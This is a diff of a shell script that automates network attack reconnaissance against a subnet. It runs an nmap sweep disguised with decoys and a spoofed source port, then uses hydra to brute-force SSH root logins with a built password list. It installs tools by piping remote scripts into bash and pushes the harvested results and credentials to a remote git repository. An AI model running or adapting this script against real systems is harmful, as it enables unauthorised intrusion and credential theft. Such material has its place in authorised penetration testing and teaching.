@@ -1,11 +1,10 @@
+# CONFIG
 export RSUBNET=192.168.56.0/24
 export LHOST=192.168.56.1
 echo "Remember to use it like: bash -x ./script"
 read waiting
-mkdir -p vulns
-mkdir -p ip_files
-mkdir -p nmap
-mkdir -p tmp
+
+# INSTALL DPENDENCIES
 sudo apt update
 sudo apt install pipx git
 pipx ensurepath
@@ -13,6 +12,19 @@ pipx install git+https://github.com/Pennyw0rth/NetExec
 sudo apt install golang -y
 go install github.com/sensepost/gowitness@latest; sudo mv $HOME/go/bin/gowitness /usr/sbin
 curl https://raw.githubusercontent.com/josemlwdf/CTFEnum/main/install.sh|bash
+
+# SETUP
+git clone git@github.com:josemlwdf/PTEST.git
+ln -sf "`pwd`/PTEST" "`echo ~`/home"
+cd ~/home
+curl https://raw.githubusercontent.com/josemlwdf/random_scripts/refs/heads/main/push -o push
+chmod +x push
+mkdir -p vulns
+mkdir -p ip_files
+mkdir -p nmap
+mkdir -p tmp
+
+# TESTS
 nmap -sn -PE $RSUBNET -D RND:5 --source-port 53 --disable-arp-ping -oG nmap/full_hosts.txt
 cat nmap/full_hosts.txt | grep "Status: Up" |awk '{print $2}' > ip_files/full_hosts_ips.txt
 gowitness scan file -f ip_files/full_hosts_ips.txt --threads 50 --ports-medium --write-none
@@ -47,3 +59,7 @@ echo 'ROOTROOT' >> tmp/pws.txt
 echo 't00r' >> tmp/pws.txt
 hydra -l root -P tmp/pws.txt -e nsr -t 4 -M ip_files/linux_hosts_ips.txt ssh | grep 'login' | grep 'password' | tee vulns/ssh_bruteforce.txt
 
+# EXPORT
+git add .
+git commit -m "Initial Recon data"
+git push
